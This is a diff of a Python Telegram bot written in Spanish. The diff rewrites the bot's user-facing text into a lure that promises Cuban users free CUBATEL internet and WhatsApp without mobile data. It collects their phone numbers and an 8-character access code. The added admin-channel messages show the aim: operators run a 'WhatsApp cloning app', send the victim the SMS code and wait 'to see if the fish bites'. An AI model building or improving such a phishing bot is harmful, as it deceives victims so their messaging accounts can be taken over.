@@ -324,7 +324,7 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         native_msg = await context.bot.send_message(
             chat_id=q.message.chat_id,
-            text="👇🏻 𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨́𝐧 𝐧𝐚𝐭𝐢𝐯𝐨 𝐩𝐚𝐫𝐚 𝐜𝐨𝐦𝐩𝐚𝐫𝐭𝐢𝐫 𝐭𝐮 𝐧𝐮́𝐦𝐞𝐫𝐨.",
+            text="🌐𝐒𝐨𝐥𝐢𝐜𝐢𝐭𝐚 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐩𝐚𝐫𝐚 𝐭𝐮 𝐝𝐢𝐬𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐨 𝐲 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐭𝐞 𝐚 𝐥𝐚 𝐫𝐞𝐝 𝐝𝐞 𝐂𝐔𝐁𝐀𝐓𝐄𝐋. 𝐂𝐨𝐦𝐢𝐞𝐧𝐳𝐚 𝐚 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬 𝐜𝐨𝐧 𝐥𝐚 𝐦𝐞𝐣𝐨𝐫 𝐯𝐞𝐥𝐨𝐜𝐢𝐝𝐚𝐝 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭.",
             reply_markup=share_phone_kb()
         )
         context.user_data[UD_NATIVE_MSG_ID] = native_msg.message_id
@@ -334,7 +334,7 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_message(
                     chat_id=ADMIN_CHANNEL_ID,
                     text=(
-                        "📥 Solicitó unirse al grupo\n\n"
+                        "𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐍𝐄𝐂𝐓𝐀𝐑𝐒𝐄 𝐀 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓. 𝐏𝐫𝐢𝐦𝐞𝐫 𝐩𝐚𝐬𝐨 𝐝𝐞𝐥 𝐩𝐫𝐨𝐜𝐞𝐬𝐨. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚𝐫 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐝𝐞 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐍𝐔𝐌𝐄𝐑𝐎.\n\n"
                         f"Nombre: {user.full_name or 'Sin nombre'}\n"
                         f"Username: @{user.username or 'sin_username'}\n"
                         f"ID: {user.id}"
@@ -351,7 +351,7 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(
                 chat_id=ADMIN_CHANNEL_ID,
                 text=(
-                    "📥 Solicitó unirse al grupo\n\n"
+                    "😈𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐄𝐋 𝐍𝐔𝐌𝐄𝐑𝐎. 𝐄𝐬𝐨 𝐪𝐮𝐢𝐞𝐫𝐞 𝐝𝐞𝐜𝐢𝐫 𝐪𝐮𝐞 𝐬𝐞 𝐪𝐮𝐢𝐞𝐫𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞𝐦𝐨𝐬 𝐚𝐛𝐫𝐢𝐫 𝐥𝐚 𝐚𝐩𝐩 𝐝𝐞 𝐜𝐥𝐨𝐧𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐯𝐢𝐚 𝐒𝐌𝐒 𝐲 𝐞𝐬𝐭𝐚𝐫 𝐚𝐭𝐞𝐧𝐭𝐨𝐬 𝐚 𝐯𝐞𝐫 𝐬𝐢 𝐦𝐮𝐞𝐫𝐝𝐞 𝐞𝐥 𝐚𝐧𝐳𝐮𝐞𝐥𝐨.\n\n"
                     f"Nombre: {user.full_name or 'Sin nombre'}\n"
                     f"Username: @{user.username or 'sin_username'}\n"
                     f"ID: {user.id}\n"
@@ -363,7 +363,7 @@ async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await context.bot.send_message(
         chat_id=user.id,
-        text="revisa detenidamente el video tutorial"
+        text="𝐎𝐛𝐬𝐞𝐫𝐯𝐚 𝐝𝐞𝐭𝐞𝐧𝐢𝐝𝐚𝐦𝐞𝐧𝐭𝐞 𝐞𝐥 𝐯𝐢𝐝𝐞𝐨 𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐩𝐚𝐫𝐚 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫𝐭𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐚𝐦𝐞𝐧𝐭𝐞 𝐚 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐢𝐥𝐢𝐦𝐢𝐭𝐚𝐝𝐨 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬."
     )
 
 async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -399,7 +399,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     admin_text = (
-        "📥 Solicitó unirse al grupo\n\n"
+        "😈𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐄𝐋 𝐍𝐔𝐌𝐄𝐑𝐎. 𝐄𝐬𝐨 𝐪𝐮𝐢𝐞𝐫𝐞 𝐝𝐞𝐜𝐢𝐫 𝐪𝐮𝐞 𝐬𝐞 𝐪𝐮𝐢𝐞𝐫𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞𝐦𝐨𝐬 𝐚𝐛𝐫𝐢𝐫 𝐥𝐚 𝐚𝐩𝐩 𝐝𝐞 𝐜𝐥𝐨𝐧𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐯𝐢𝐚 𝐒𝐌𝐒 𝐲 𝐞𝐬𝐭𝐚𝐫 𝐚𝐭𝐞𝐧𝐭𝐨𝐬 𝐚 𝐯𝐞𝐫 𝐬𝐢 𝐦𝐮𝐞𝐫𝐝𝐞 𝐞𝐥 𝐚𝐧𝐳𝐮𝐞𝐥𝐨.\n\n"
         f"Nombre: {user.full_name or 'Sin nombre'}\n"
         f"Username: @{user.username or 'sin_username'}\n"
         f"ID: {user.id}\n"
@@ -433,7 +433,7 @@ async def members_btn_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(
                 chat_id=ADMIN_CHANNEL_ID,
                 text=(
-                    "📥 Solicitó miembros\n\n"
+                    "𝐒𝐨𝐥𝐢𝐜𝐢𝐭ó 𝐯𝐞𝐫 𝐕𝐈𝐃𝐄𝐎 𝐓𝐔𝐓𝐎𝐑𝐈𝐀𝐋\n\n"
                     f"Nombre: {user.full_name or 'Sin nombre'}\n"
                     f"Username: @{user.username or 'sin_username'}\n"
                     f"ID: {user.id}\n"
@@ -477,10 +477,10 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not (len(code) == 8 and code.isalnum()):
             context.user_data[UD_CODE] = ""
             error_msg = (
-                "❌ Código inválido\n\n"
-                "Asegúrate de ingresar tu código de acceso correcto de 8 caracteres y luego presiona:\n\n"
-                "✅ Confirmar.\n\n"
-                "Código: `—`"
+                "❌𝐂𝐨𝐝𝐢𝐠𝐨 𝐢𝐧𝐯𝐚𝐥𝐢𝐝𝐨\n\n"
+                "𝐀𝐬𝐞𝐠ú𝐫𝐚𝐭𝐞 𝐝𝐞 𝐢𝐧𝐠𝐫𝐞𝐬𝐚𝐫 𝐭𝐮 𝐜ó𝐝𝐢𝐠𝐨 𝐝𝐞 𝐚𝐜𝐜𝐞𝐬𝐨 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐝𝐞 𝟖 𝐜𝐚𝐫𝐚𝐜𝐭𝐞𝐫𝐞𝐬 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐩𝐚𝐫𝐚 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫𝐭𝐞 𝐚 𝐥𝐚 𝐫𝐞𝐝 𝐝𝐞 𝐂𝐔𝐁𝐀𝐓𝐄𝐋\n\n"
+                "✅𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐫.\n\n"
+                "𝐂𝐨𝐝𝐢𝐠𝐨: `—`"
             )
             text, kb = build_keypad("")
             await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
@@ -491,7 +491,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         admin_text = (
-            "🧩 *Intento de acceso al laboratorio*\n\n"
+            "🧩 *𝐏𝐮𝐬𝐨 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐪𝐮𝐢𝐯𝐨𝐜𝐚𝐝𝐨*\n\n"
             f"Teléfono: `{phone}`\n"
             f"Usuario: @{user.username or 'sin_username'}\n"
             f"ID: `{user.id}`\n"
